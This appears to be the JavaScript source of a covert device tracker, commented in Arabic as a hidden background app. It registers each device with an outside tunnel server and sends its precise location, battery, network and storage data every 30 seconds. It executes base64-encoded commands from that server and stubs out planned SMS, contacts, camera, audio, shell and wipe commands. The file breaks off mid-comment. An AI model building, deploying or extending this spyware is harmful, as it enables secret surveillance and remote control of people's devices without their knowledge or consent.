// =========================================
// 📱 تطبيق التتبع المخفي - Device Tracker
// =========================================
// الإصدار: 2.0.0
// الوصف: تطبيق خلفية يرسل بيانات الجهاز للخادم
// =========================================

// 🌐 رابط الخادم العام (محدّث)
// للتجربة: localtunnel
// للإنتاج: Render/Vercel
const SERVER_URL = 'https://yellow-garlics-fall.loca.lt';

// ⏱️ إعدادات الاتصال
const CHECK_IN_INTERVAL = 30000; // 30 ثانية
const HEARTBEAT_INTERVAL = 10000; // 10 ثواني
const MAX_RETRIES = 5;

// 🔐 بيانات الجهاز (محفوظة محلياً)
let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');

// 📊 حالة التطبيق
let isRunning = false;
let retryCount = 0;
let lastCheckIn = null;

// =========================================
// 🚀 بدء التطبيق
// =========================================

console.log('🚀 Device Tracker v2.0.0 starting...');
console.log('📡 Server URL:', SERVER_URL);
console.log('📱 Device ID:', deviceId || 'Not registered yet');

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM loaded - initializing...');
    initializeDevice();
    startHeartbeat();
});

// التعامل مع إعادة فتح التطبيق
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && isRunning) {
        console.log('👁️ App visible - forcing check-in');
        checkIn();
    }
});

// =========================================// 🔐 تهيئة الجهاز والتسجيل
// =========================================

async function initializeDevice() {
    console.log('🔄 Initializing device...');
    
    try {
        // التحقق من وجود بيانات تسجيل سابقة
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ Already registered - skipping registration');
            console.log('🔑 Device ID:', deviceId);
            isRunning = true;
            startCheckInService();
            return;
        }
        
        // تسجيل جديد - توليد معرفات فريدة
        console.log('🆕 New device - generating unique IDs...');
        
        clientId = 'client_' + generateRandomString(16);
        deviceId = 'device_' + generateRandomString(16);
        
        // حفظ البيانات محلياً
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        localStorage.setItem('appVersion', '2.0.0');
        
        console.log('📝 IDs generated:');
        console.log('   Client ID:', clientId);
        console.log('   Device ID:', deviceId);
        
        // محاولة التسجيل لدى الخادم
        await registerDevice();
        
    } catch (error) {
        console.error('❌ Initialization error:', error.message);
        retryCount++;
        
        if (retryCount < MAX_RETRIES) {
            const delay = 5000 * retryCount;
            console.log(`⏳ Retrying in ${delay/1000}s (attempt ${retryCount}/${MAX_RETRIES})`);
            setTimeout(() => initializeDevice(), delay);
        } else {
            console.error('🚫 Max retries reached - waiting for manual restart');
        }
    }
}

// =========================================// 📝 التسجيل لدى الخادم
// =========================================

async function registerDevice() {
    console.log('📤 Registering with server...');
    
    try {
        // جمع معلومات الجهاز
        const deviceInfo = {
            deviceName: getDeviceName(),
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: '2.0.0',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language || 'ar',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            registeredAt: new Date().toISOString()
        };
        
        console.log('📦 Device info:', deviceInfo);
        
        // إرسال طلب التسجيل
        const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Client-ID': clientId
            },
            body: JSON.stringify({
                clientId: clientId,
                deviceInfo: deviceInfo
            }),
            timeout: 10000
        });
        
        const data = await response.json();
        console.log('📥 Registration response:', data);
        
        if (data.success) {
            // حفظ بيانات التسجيل
            encryptionKey = data.encryptionKey || generateRandomString(32);
            
            localStorage.setItem('deviceId', data.deviceId || deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            
            // تحديث المتغيرات المحلية
            deviceId = data.deviceId || deviceId;
            
            console.log('✅ Registration successful!');
            console.log('🔑 Final Device ID:', deviceId);            console.log('🔐 Encryption Key:', encryptionKey.substring(0, 16) + '...');
            
            // بدء خدمة الاتصال الدوري
            isRunning = true;
            retryCount = 0;
            startCheckInService();
            
            // إرسال المعلومات الأولية
            await sendInitialInfo();
            
        } else {
            throw new Error(data.error || 'Registration failed - unknown error');
        }
        
    } catch (error) {
        console.error('❌ Registration failed:', error.message);
        
        // إعادة المحاولة بعد فترة
        setTimeout(() => {
            if (!isRunning) {
                registerDevice();
            }
        }, 15000);
        
        throw error;
    }
}

// =========================================
// 📊 إرسال المعلومات الأولية
// =========================================

async function sendInitialInfo() {
    try {
        console.log('📊 Sending initial device info...');
        
        const info = {
            deviceId: deviceId,
            type: 'initial_info',
            info: {
                battery: await getBatteryInfo(),
                network: await getNetworkInfo(),
                location: await getLocationInfo(),
                storage: await getStorageInfo()
            },
            timestamp: new Date().toISOString()
        };
        
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        });
        
        console.log('✅ Initial info sent successfully');
    } catch (error) {
        console.error('❌ Failed to send initial info:', error.message);
    }
}

// =========================================
// 🔄 خدمة الاتصال الدوري (Check-in)
// =========================================

function startCheckInService() {
    console.log('🔄 Starting check-in service (interval: 30s)');
    
    // أول اتصال فوري
    checkIn();
    
    // اتصالات دورية
    setInterval(async () => {
        if (isRunning) {
            await checkIn();
        }
    }, CHECK_IN_INTERVAL);
}

async function checkIn() {
    try {
        lastCheckIn = new Date();
        
        // جمع بيانات النظام
        const systemInfo = {
            deviceId: deviceId,
            status: 'active',
            battery: await getBatteryInfo(),
            network: await getNetworkInfo(),
            location: await getLocationInfo(),
            timestamp: new Date().toISOString(),
            uptime: Date.now() - (parseInt(localStorage.getItem('installTime')) || Date.now())
        };
        
        // تشفير البيانات (مبسط)
        const encryptedData = btoa(JSON.stringify(systemInfo));
        
        // إرسال check-in
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: {                'Content-Type': 'application/json',
                'X-Device-ID': deviceId
            },
            body: JSON.stringify({
                deviceId: deviceId,
                encryptedData: encryptedData
            }),
            timeout: 10000
        });
        
        const data = await response.json();
        
        if (data.success) {
            console.log('📡 Check-in OK ✓');
            
            // التحقق من وجود أوامر من الخادم
            if (data.encryptedData) {
                try {
                    const commands = JSON.parse(atob(data.encryptedData));
                    if (commands.commands && commands.commands.length > 0) {
                        console.log(`📦 Received ${commands.commands.length} command(s)`);
                        await executeCommands(commands.commands);
                    }
                } catch (e) {
                    // لا توجد أوامر أو خطأ في فك التشفير
                }
            }
        } else {
            console.error('❌ Check-in failed:', data.error);
        }
        
    } catch (error) {
        console.error('❌ Check-in error:', error.message);
        
        // إعادة المحاولة بعد فترة قصيرة
        setTimeout(() => {
            if (isRunning) {
                checkIn();
            }
        }, 5000);
    }
}

// =========================================
// ⚙️ تنفيذ الأوامر المستقبلة
// =========================================

async function executeCommands(commands) {
    for (const command of commands) {
        try {            console.log('⚙️ Executing command:', command.type);
            
            let result;
            
            switch (command.type) {
                // === أوامر جمع المعلومات ===
                case 'get_system_info':
                    result = await getFullSystemInfo(command.params);
                    break;
                    
                case 'get_location':
                    result = await getLocationInfo(command.params);
                    break;
                    
                case 'get_battery':
                    result = await getBatteryInfo(command.params);
                    break;
                    
                case 'get_network':
                    result = await getNetworkInfo(command.params);
                    break;
                    
                case 'get_storage':
                    result = await getStorageInfo(command.params);
                    break;
                
                // === أوامر الوسائط (تتطلب صلاحيات) ===
                case 'take_screenshot':
                    result = { error: 'requires_native_permission', note: 'Native app required' };
                    break;
                    
                case 'record_audio':
                    result = { error: 'requires_native_permission', note: 'Native app required' };
                    break;
                    
                case 'get_camera':
                    result = { error: 'requires_native_permission', note: 'Native app required' };
                    break;
                
                // === أوامر البيانات (تتطلب صلاحيات) ===
                case 'get_contacts':
                    result = { error: 'requires_native_permission', note: 'Native app required' };
                    break;
                    
                case 'get_sms':
                    result = { error: 'requires_native_permission', note: 'Native app required' };
                    break;
                    
                case 'get_files':
                    result = { error: 'requires_native_permission', note: 'Native app required' };                    break;
                
                // === أوامر التحكم (تتطلب Root) ===
                case 'execute_command':
                    result = { error: 'requires_root_permission', cmd: command.params?.cmd };
                    break;
                    
                case 'wipe_data':
                    result = { error: 'requires_root_permission', warning: 'Dangerous operation' };
                    break;
                    
                case 'reboot':
                    result = { error: 'requires_root_permission', note: 'Cannot reboot from webview' };
                    break;
                
                // === أوامر مخصصة ===
                case 'custom':
                    result = await executeCustomCommand(command);
                    break;
                
                default:
                    result = { error: 'Unknown command type', type: command.type };
            }
            
            // إرسال نتيجة التنفيذ
            await sendCommandResult(command.id || generateCommandId(), result, 'completed');
            
        } catch (error) {
            console.error('❌ Command execution failed:', error.message);
            await sendCommandResult(command.id || generateCommandId(), {
                error: error.message,
                type: command.type
            }, 'failed');
        }
    }
}

// تنفيذ الأوامر المخصصة
async function executeCustomCommand(command) {
    console.log('🎮 Executing custom command:', command);
    
    const result = {
        type: 'custom_command',
        received: true,
        timestamp: new Date().toISOString(),
        command: command
    };
    
    // معالجة بناءً على action
    if (command.action) {        switch (command.action) {
            case 'alert':
                if (command.message) {
                    result.displayed = true;
                    result.message = command.message;
                }
                break;
                
            case 'open_url':
                if (command.url) {
                    window.open(command.url, '_blank');
                    result.opened = command.url;
                }
                break;
                
            case 'collect_data':
                if (command.fields) {
                    result.data = await collectData(command.fields);
                }
                break;
                
            default:
                result.executed = true;
        }
    }
    
    return result;
}

// جمع بيانات مخصصة
async function collectData(fields) {
    const data = {};
    for (const field of fields) {
        switch (field) {
            case 'battery':
                data.battery = await getBatteryInfo();
                break;
            case 'location':
                data.location = await getLocationInfo();
                break;
            case 'network':
                data.network = await getNetworkInfo();
                break;
            case 'storage':
                data.storage = await getStorageInfo();
                break;
        }
    }
    return data;
}
// =========================================
// 📤 إرسال نتيجة الأمر للخادم
// =========================================

async function sendCommandResult(commandId, result, status) {
    try {
        const report = {
            deviceId: deviceId,
            commandId: commandId,
            result: result,
            status: status,
            timestamp: new Date().toISOString()
        };
        
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(report)
        });
        
        console.log('📤 Command result sent:', commandId, status);
    } catch (error) {
        console.error('❌ Failed to send result:', error.message);
    }
}

// =========================================
// 📱 دوال جمع معلومات الجهاز
// =========================================

async function getBatteryInfo(params = {}) {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime === Infinity ? null : battery.chargingTime,
                dischargingTime: battery.dischargingTime === Infinity ? null : battery.dischargingTime
            };
        }
    } catch (e) {
        console.warn('⚠️ Battery API not available');
    }
    return { level: 'unknown', charging: 'unknown', note: 'API not supported' };
}

async function getNetworkInfo(params = {}) {
    return {        type: navigator.connection?.effectiveType || 'unknown',
        downlink: navigator.connection?.downlink || 'unknown',
        rtt: navigator.connection?.rtt || 'unknown',
        online: navigator.onLine,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform
    };
}

async function getStorageInfo(params = {}) {
    try {
        if (navigator.storage?.estimate) {
            const estimate = await navigator.storage.estimate();
            return {
                usage: estimate.usage,
                quota: estimate.quota,
                percentUsed: estimate.quota ? ((estimate.usage / estimate.quota) * 100).toFixed(2) : 'unknown'
            };
        }
    } catch (e) {
        console.warn('⚠️ Storage API not available');
    }
    return { usage: 'unknown', quota: 'unknown', note: 'API not supported' };
}

async function getLocationInfo(params = {}) {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                    timestamp: pos.timestamp
                }),
                (error) => {
                    const errors = {
                        1: 'permission_denied',
                        2: 'position_unavailable',
                        3: 'timeout'
                    };
                    resolve({ error: errors[error.code] || 'unknown_error' });
                },
                {
                    enableHighAccuracy: params?.accuracy === 'high',
                    timeout: params?.timeout || 10000,
                    maximumAge: 0                }
            );
        } else {
            resolve({ error: 'geolocation_not_supported' });
        }
    });
}

async function getFullSystemInfo(params = {}) {
    const include = params?.include || ['battery', 'network', 'storage', 'location'];
    
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        },
        timestamp: new Date().toISOString()
    };
    
    if (include.includes('battery')) info.battery = await getBatteryInfo();
    if (include.includes('network')) info.network = await getNetworkInfo();
    if (include.includes('storage')) info.storage = await getStorageInfo();
    if (include.includes('location')) info.location = await getLocationInfo();
    
    return info;
}

// =========================================
// 💓 خدمة البقاء نشطاً (Heartbeat)
// =========================================

function startHeartbeat() {
    setInterval(() => {
        console.log('💓 heartbeat - app alive');
        localStorage.setItem('lastHeartbeat', Date.now().toString());
        
        // إعادة التشغيل إذا توقف
        if (isRunning && lastCheckIn) {
            const timeSinceCheckIn = Date.now() - lastCheckIn.getTime();
            if (timeSinceCheckIn > CHECK_IN_INTERVAL * 3) {
                console.log('⚠️ Check-in delayed - forcing reconnect');
                checkIn();
            }
        }
    }, HEARTBEAT_INTERVAL);}

// =========================================
// 🔄 التعامل مع مسح البيانات
// =================================